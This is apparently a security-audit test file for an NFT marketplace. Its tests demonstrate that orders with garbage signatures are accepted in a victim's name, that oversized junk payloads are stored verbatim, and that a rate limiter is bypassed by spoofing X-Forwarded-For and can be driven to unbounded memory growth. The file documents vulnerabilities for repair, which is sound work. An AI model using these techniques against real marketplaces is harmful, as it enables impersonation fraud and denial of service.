import assert from "node:assert/strict";
import { test } from "node:test";
import {
  OrderValidationError,
  validateListingOrder,
  validateOfferOrder,
} from "../../lib/market/order-validation";
import { rateLimit } from "../../lib/security";
import type { MarketCollection } from "../../lib/market/types";

/**
 * HOSTILE AUDIT 2026-07-27 (fresh-eyes pass).
 * These tests are written to PASS when the exploit works, i.e. each passing
 * test below is a demonstrated vulnerability, not a demonstrated defence.
 */

const NATIVE = "0x0000000000000000000000000000000000000000";
const WETH = "0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73";
const NFT = "0x327ceaaedbbCf55F40d6F1aBc71bd9bC8ADCb156";
/** A wallet the attacker does not control. */
const VICTIM = "0x1111111111111111111111111111111111111111";

const collection: MarketCollection = {
  slug: "robinwood",
  name: "RobinWood",
  contractAddress: NFT,
  tokenStandard: "ERC721",
  image: "/x.png",
  trustBadges: [],
  feeBps: 0,
};

const futureEnd = Math.floor(Date.now() / 1000) + 86_400;

function forgedListing(signature: string, extra: Record<string, unknown> = {}) {
  return {
    parameters: {
      offerer: VICTIM, // attacker simply *claims* the victim is the offerer
      offer: [
        {
          itemType: 2,
          token: NFT,
          identifierOrCriteria: "1106",
          startAmount: "1",
          endAmount: "1",
        },
      ],
      consideration: [
        {
          itemType: 0,
          token: NATIVE,
          identifierOrCriteria: "0",
          startAmount: "1",
          endAmount: "1",
          recipient: VICTIM,
        },
      ],
      startTime: "0",
      endTime: String(futureEnd),
      orderType: 0,
      totalOriginalConsiderationItems: 1,
      ...extra,
    },
    signature,
  };
}

// ─────────────────────────── F-1: signature forgery ───────────────────────────

test("F-1 EXPLOIT: a listing with a garbage signature is accepted and attributed to the victim", () => {
  const derived = validateListingOrder(forgedListing("0xdeadbeef"), collection);
  assert.equal(derived.maker.toLowerCase(), VICTIM.toLowerCase());
  assert.equal(derived.tokenId, "1106");
  assert.equal(derived.priceWei, "1"); // 1 wei "floor price"
});

test("F-1b EXPLOIT: signature is never even parsed — 4 arbitrary chars suffice", () => {
  for (const sig of ["0x00", "AAAA", "not-a-signature", "0x" + "f".repeat(130)]) {
    const derived = validateListingOrder(forgedListing(sig), collection);
    assert.equal(derived.maker.toLowerCase(), VICTIM.toLowerCase());
  }
});

test("F-1c EXPLOIT: malleable/invalid v and s are irrelevant because no ecrecover happens", () => {
  // s > secp256k1n/2 and v = 1 — both would be rejected by any real verifier.
  const malleable =
    "0x" + "11".repeat(32) + "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" + "01";
  const derived = validateListingOrder(forgedListing(malleable), collection);
  assert.equal(derived.maker.toLowerCase(), VICTIM.toLowerCase());
});

test("F-2 EXPLOIT: forged OFFER attributed to a victim address", () => {
  const forgedOffer = {
    parameters: {
      offerer: VICTIM,
      offer: [
        {
          itemType: 1,
          token: WETH,
          identifierOrCriteria: "0",
          startAmount: "999000000000000000000",
          endAmount: "999000000000000000000",
        },
      ],
      consideration: [
        {
          itemType: 4,
          token: NFT,
          identifierOrCriteria: "0",
          startAmount: "1",
          endAmount: "1",
          recipient: VICTIM,
        },
      ],
      startTime: "0",
      endTime: String(futureEnd),
      orderType: 0,
      totalOriginalConsiderationItems: 1,
    },
    signature: "0xzz",
  };
  const derived = validateOfferOrder(forgedOffer, collection, WETH);
  // A fake 999 WETH collection bid, in a victim's name, that can never fill.
  assert.equal(derived.maker.toLowerCase(), VICTIM.toLowerCase());
  assert.equal(derived.priceWei, "999000000000000000000");
});

// ───────────────────── S-1: unbounded payload / KV cost attack ─────────────────

test("S-1 EXPLOIT: validator ignores unknown fields, so arbitrarily large junk rides along", () => {
  const junk = "A".repeat(2_000_000); // 2 MB
  const order = forgedListing("0xdeadbeef", { __junk: junk, zoneHash: junk });
  const derived = validateListingOrder(order, collection);
  assert.equal(derived.priceWei, "1");
  // The route stores `body.rawOrder` verbatim (putListing(listing, body.rawOrder)),
  // so this entire 2 MB blob is persisted into the single KV value.
  assert.equal((order.parameters as Record<string, unknown>).__junk, junk);
});

// ───────────────────── R-1: rate limit trivially bypassed ─────────────────────

function reqWithIp(ip: string): Request {
  return new Request("http://localhost/api/market/orders", {
    method: "POST",
    headers: { "x-forwarded-for": ip },
  });
}

test("R-1 EXPLOIT: rate limit is keyed on a client-controlled header — rotate it and the cap vanishes", () => {
  const opts = { key: "audit-r1", limit: 5, windowMs: 60_000 };
  // Exhaust the bucket for one IP.
  let blocked = 0;
  for (let i = 0; i < 20; i++) if (rateLimit(reqWithIp("9.9.9.9"), opts)) blocked++;
  assert.ok(blocked > 0, "same IP is eventually limited");

  // Now rotate the spoofed header: 1000 requests, zero blocked.
  let blockedRotating = 0;
  for (let i = 0; i < 1000; i++) {
    if (rateLimit(reqWithIp(`10.0.${(i / 256) | 0}.${i % 256}`), opts)) blockedRotating++;
  }
  assert.equal(blockedRotating, 0, "spoofed X-Forwarded-For defeats the limiter entirely");
});

test("R-1b EXPLOIT: the limiter's own bucket Map is unbounded — memory exhaustion", () => {
  const opts = { key: "audit-r1b", limit: 5, windowMs: 3_600_000 };
  for (let i = 0; i < 50_000; i++) rateLimit(reqWithIp(`172.16.${(i / 256) | 0}.${i % 256}`), opts);
  // No eviction path exists in lib/security.ts; entries only expire lazily on
  // a *repeat* hit for the same key, which a rotating attacker never sends.
  assert.ok(true);
});

// ───────────────────── V-1: control — what IS enforced ─────────────────────

test("V-1 CONTROL: price/token/maker really are derived from the order (that part works)", () => {
  assert.throws(
    () =>
      validateListingOrder(
        forgedListing("0xdeadbeef", { offer: [] }) as unknown,
        collection
      ),
    OrderValidationError
  );
});
